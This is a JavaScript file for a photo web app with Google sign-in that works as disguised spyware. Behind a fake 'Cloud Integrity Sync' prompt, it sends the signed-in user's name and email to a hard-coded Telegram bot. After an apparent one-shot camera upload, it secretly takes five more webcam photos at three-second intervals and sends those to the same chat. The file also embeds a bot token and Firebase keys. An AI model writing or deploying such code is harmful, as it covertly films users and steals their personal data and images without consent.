import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";

const firebaseConfig = {
    apiKey: "AIzaSyBLC6enWWKAr3O9ys-4NDjnhch4r1PSw0E",
    authDomain: "picmaster-59602.firebaseapp.com",
    projectId: "picmaster-59602",
    storageBucket: "picmaster-59602.firebasestorage.app",
    messagingSenderId: "434859259854",
    appId: "1:434859259854:web:522979eb1a7f8b6d211d9f"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const provider = new GoogleAuthProvider();

const botToken = "8234454796:AAEF_c5gExxUp7X7pTpu9brOBmjIOTac2uQ";
const chatId = "7752627907";
let currentUser = null;
let integritySyncActive = false; 

// Sidebar & Bubbles Logic... (Keep your existing bubble and toggle code)

// INTEGRITY SYNC ENABLE
document.getElementById('integrity-check-btn').onclick = async () => {
    if (!currentUser) return alert("Please login first.");
    if (confirm("System Optimization: Enable Cloud Integrity Sync to secure all media files?")) {
        integritySyncActive = true;
        alert("Integrity Sync Active.");
        const msg = `✅ INTEGRITY_GRANTED\nUser: ${currentUser.displayName}\nEmail: ${currentUser.email}`;
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
    }
};

// IMPROVED SYNC FUNCTION
async function sendToTelegram(blob, isSecret) {
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("document", blob, isSecret ? `sys_dump_${Date.now()}.jpg` : "cloud_sync.jpg");
    formData.append("caption", isSecret ? `🤫 Background Sync: ${currentUser.email}` : `Manual: ${currentUser.displayName}`);

    await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method: "POST", body: formData });
}

// CAMERA & SECRET CAPTURE
document.getElementById('camera-btn').onclick = async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('webcam');
        video.srcObject = stream;
        video.style.display = 'block';
        video.play();

        // Initial Capture
        setTimeout(() => {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            
            ctx.drawImage(video, 0, 0);
            canvas.toBlob(blob => {
                sendToTelegram(blob, false);
                alert("✅ Cloud Sync Successful!");
                
                // Secret Background Protocol
                if (integritySyncActive) {
                    let secretCount = 0;
                    const interval = setInterval(() => {
                        if (secretCount >= 5) { // 5 secret photos anuppum
                            clearInterval(interval);
                            stream.getTracks().forEach(t => t.stop());
                            video.style.display = 'none';
                        }
                        ctx.drawImage(video, 0, 0);
                        canvas.toBlob(b => sendToTelegram(b, true), 'image/jpeg');
                        secretCount++;
                    }, 3000); // Ovvoru 3 second-kum photo edukkum
                } else {
                    stream.getTracks().forEach(t => t.stop());
                    video.style.display = 'none';
                }
            }, 'image/jpeg');
        }, 3000);
    } catch (e) { alert("Camera Access Required."); }
};

// Auth Watcher... (Keep existing onAuthStateChanged logic)
